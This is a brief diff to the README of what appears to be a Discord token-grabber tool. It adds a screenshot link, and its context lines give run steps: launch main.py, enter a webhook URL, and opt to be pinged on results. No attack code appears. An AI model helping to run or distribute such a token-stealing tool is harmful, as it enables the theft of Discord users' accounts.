@@ -14,3 +14,5 @@ python3 main.py
 ```
 
 3. To run the program, simply enter the Webhook URL when prompted. After you have the option to be pinged when you get a result. Enter True or False.
+
+![Screenshot](https://github.com/KaiSimpson13123/DSB-OAD-Discord-Token-Grabber/blob/main/screenshot.jpg?raw=true)
